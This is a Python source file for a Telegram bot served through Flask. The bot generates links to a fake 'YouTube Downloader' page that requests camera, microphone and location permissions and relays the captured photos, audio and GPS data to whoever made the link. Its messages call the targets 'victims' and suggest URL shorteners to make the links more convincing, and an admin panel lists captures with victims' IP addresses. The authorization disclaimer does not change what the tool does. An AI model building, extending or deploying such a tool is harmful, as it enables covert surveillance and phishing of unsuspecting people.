import os
import json
import logging
from flask import Flask, request, jsonify
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Dispatcher, CommandHandler, CallbackQueryHandler
import hashlib
import time
import requests

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_IDS = [int(x.strip()) for x in os.environ.get('ADMIN_IDS', '').split(',') if x.strip()]
APP_URL = os.environ.get('APP_URL', 'https://your-app.vercel.app')

bot = Bot(token=BOT_TOKEN)

# Simple in-memory storage (use a DB for production)
# /tmp is writable on Vercel serverless
DATA_DIR = '/tmp/bot_data'
os.makedirs(DATA_DIR, exist_ok=True)

def get_user_data():
    """Load user data from disk"""
    path = os.path.join(DATA_DIR, 'users.json')
    if os.path.exists(path):
        with open(path, 'r') as f:
            return json.load(f)
    return {}

def save_user_data(data):
    path = os.path.join(DATA_DIR, 'users.json')
    with open(path, 'w') as f:
        json.dump(data, f)

def generate_link_id():
    """Generate a unique link ID"""
    h = hashlib.sha256(str(time.time()).encode() + os.urandom(16))
    return h.hexdigest()[:12]

def start(update, context):
    """Handle /start command"""
    user = update.effective_user
    user_id = user.id
    
    welcome_text = (
        f"👋 **Welcome {user.first_name}!**\n\n"
        f"I'm your **Security Testing Assistant** 🔐\n\n"
        f"🤖 This bot generates phishing simulation links for authorized\n"
        f"   penetration testing engagements.\n\n"
        f"📌 **What you can do:**\n"
        f"• Generate a fake YouTube download page that requests permissions\n"
        f"• Capture camera, microphone, and location data\n"
        f"• Get real-time notifications when victims interact\n\n"
        f"⚠️ **Use only on systems you own or have written authorization to test.**\n\n"
        f"👇 Click below to generate your phishing link"
    )
    
    keyboard = [
        [InlineKeyboardButton("🎣 Generate Phishing Link", callback_data="generate_link")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    update.message.reply_text(
        welcome_text,
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

def generate_link_callback(update, context):
    """Handle the generate link button"""
    query = update.callback_query
    query.answer()
    
    user = query.from_user
    link_id = generate_link_id()
    
    # Store link metadata
    links_file = os.path.join(DATA_DIR, 'links.json')
    links = {}
    if os.path.exists(links_file):
        with open(links_file, 'r') as f:
            links = json.load(f)
    
    links[link_id] = {
        'creator_id': user.id,
        'creator_name': user.full_name,
        'creator_username': user.username,
        'created_at': time.time(),
        'captures': []
    }
    
    with open(links_file, 'w') as f:
        json.dump(links, f)
    
    # Show Terms & Conditions
    terms_text = (
        "📋 **Terms & Conditions**\n\n"
        "By proceeding, you confirm:\n\n"
        "✅ You have **written authorization** to test the target\n\n"
        "✅ You understand this is for **security assessment** only\n\n"
        "✅ You will **not use** this for unauthorized access\n\n"
        "✅ All data captured will be handled **responsibly**\n\n"
        "Do you accept these terms?"
    )
    
    keyboard = [
        [
            InlineKeyboardButton("✅ I Accept", callback_data=f"accept_terms_{link_id}"),
            InlineKeyboardButton("❌ Cancel", callback_data="cancel")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    query.edit_message_text(
        terms_text,
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

def accept_terms_callback(update, context):
    """Handle terms acceptance"""
    query = update.callback_query
    query.answer()
    
    data = query.data
    link_id = data.replace('accept_terms_', '')
    
    phishing_url = f"{APP_URL}/{link_id}"
    
    result_text = (
        "✅ **Terms Accepted!**\n\n"
        "Here's your phishing link:\n\n"
        f"🔗 `{phishing_url}`\n\n"
        "📋 **What this link does:**\n"
        "• Opens a fake \"YouTube Downloader\" verification page\n"
        "• Requests **Camera, Microphone, and Location** permissions\n"
        "• If granted, captures photo, audio recording, and GPS coordinates\n"
        "• Sends captured data directly to you here in this chat\n\n"
        "📌 **Tips:**\n"
        "• Use URL shorteners for more convincing links\n"
        "• The page looks like a content verification screen\n"
        "• You'll get instant notifications when data is captured\n\n"
        "👇 Click below to generate another link"
    )
    
    keyboard = [
        [InlineKeyboardButton("🎣 Generate Another Link", callback_data="generate_link")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    query.edit_message_text(
        result_text,
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

def cancel_callback(update, context):
    """Handle cancel"""
    query = update.callback_query
    query.answer()
    
    query.edit_message_text(
        "❌ Operation cancelled. Send /start to try again.",
        parse_mode='Markdown'
    )

def admin_panel(update, context):
    """Admin panel - only for authorized admins"""
    user = update.effective_user
    
    if user.id not in ADMIN_IDS:
        update.message.reply_text("⛔ Unauthorized. You are not an admin.")
        return
    
    # Load stats
    links_file = os.path.join(DATA_DIR, 'links.json')
    links = {}
    if os.path.exists(links_file):
        with open(links_file, 'r') as f:
            links = json.load(f)
    
    total_links = len(links)
    total_captures = sum(len(l.get('captures', [])) for l in links.values())
    
    admin_text = (
        "🔐 **Admin Panel**\n\n"
        f"📊 **Statistics:**\n"
        f"• Total links generated: {total_links}\n"
        f"• Total captures: {total_captures}\n\n"
        f"👤 Your ID: `{user.id}`\n\n"
        "Use the buttons below to manage the bot:"
    )
    
    keyboard = [
        [InlineKeyboardButton("📋 View All Links", callback_data="admin_links")],
        [InlineKeyboardButton("📸 View All Captures", callback_data="admin_captures")],
        [InlineKeyboardButton("🗑️ Clear All Data", callback_data="admin_clear")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    update.message.reply_text(
        admin_text,
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

def admin_callback_handler(update, context):
    """Handle admin panel callbacks"""
    query = update.callback_query
    query.answer()
    
    if query.from_user.id not in ADMIN_IDS:
        query.edit_message_text("⛔ Unauthorized.")
        return
    
    links_file = os.path.join(DATA_DIR, 'links.json')
    links = {}
    if os.path.exists(links_file):
        with open(links_file, 'r') as f:
            links = json.load(f)
    
    if query.data == "admin_links":
        if not links:
            query.edit_message_text("📋 No links generated yet.")
            return
        
        text = "**📋 All Generated Links:**\n\n"
        for lid, ldata in links.items():
            capture_count = len(ldata.get('captures', []))
            created = time.strftime('%Y-%m-%d %H:%M', time.localtime(ldata['created_at']))
            text += f"🔗 `{lid}` — {capture_count} captures — {created}\n"
            text += f"   Creator: {ldata['creator_name']}\n\n"
        
        keyboard = [[InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_back")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        query.edit_message_text(text, parse_mode='Markdown', reply_markup=reply_markup)
    
    elif query.data == "admin_captures":
        all_captures = []
        for lid, ldata in links.items():
            for cap in ldata.get('captures', []):
                cap['link_id'] = lid
                all_captures.append(cap)
        
        if not all_captures:
            query.edit_message_text("📸 No captures yet.")
            return
        
        text = f"**📸 Recent Captures ({len(all_captures)} total):**\n\n"
        for cap in all_captures[-5:]:  # Show last 5
            ts = cap.get('timestamp', 'Unknown')
            ip = cap.get('ip', 'Unknown')
            cam = '✅' if cap.get('hasCamera') else '❌'
            mic = '✅' if cap.get('hasMic') else '❌'
            loc = '✅' if cap.get('hasLocation') else '❌'
            text += f"• {ts[:19]} | IP: {ip} | 📸{cam} 🎙️{mic} 📍{loc}\n"
        
        keyboard = [[InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_back")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        query.edit_message_text(text, parse_mode='Markdown', reply_markup=reply_markup)
    
    elif query.data == "admin_clear":
        os.remove(links_file)
        query.edit_message_text("🗑️ All data cleared successfully.")
    
    elif query.data == "admin_back":
        keyboard = [
            [InlineKeyboardButton("📋 View All Links", callback_data="admin_links")],
            [InlineKeyboardButton("📸 View All Captures", callback_data="admin_captures")],
            [InlineKeyboardButton("🗑️ Clear All Data", callback_data="admin_clear")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        query.edit_message_text(
            "🔐 **Admin Panel**\n\nChoose an option:",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )

# Initialize dispatcher
dispatcher = Dispatcher(bot, None, use_context=True)
dispatcher.add_handler(CommandHandler('start', start))
dispatcher.add_handler(CommandHandler('admin', admin_panel))
dispatcher.add_handler(CallbackQueryHandler(generate_link_callback, pattern='^generate_link$'))
dispatcher.add_handler(CallbackQueryHandler(accept_terms_callback, pattern='^accept_terms_'))
dispatcher.add_handler(CallbackQueryHandler(cancel_callback, pattern='^cancel$'))
dispatcher.add_handler(CallbackQueryHandler(admin_callback_handler, pattern='^admin_'))

@app.route('/', methods=['GET', 'POST'])
def webhook():
    """Handle incoming Telegram webhook"""
    if request.method == 'POST':
        try:
            update = Update.de_json(request.get_json(force=True), bot)
            dispatcher.process_update(update)
            return '', 200
        except Exception as e:
            logger.error(f"Webhook error: {e}")
            return 'error', 500
    return 'Webhook active', 200

# For local testing
if __name__ == '__main__':
    app.run(debug=True, port=5000)
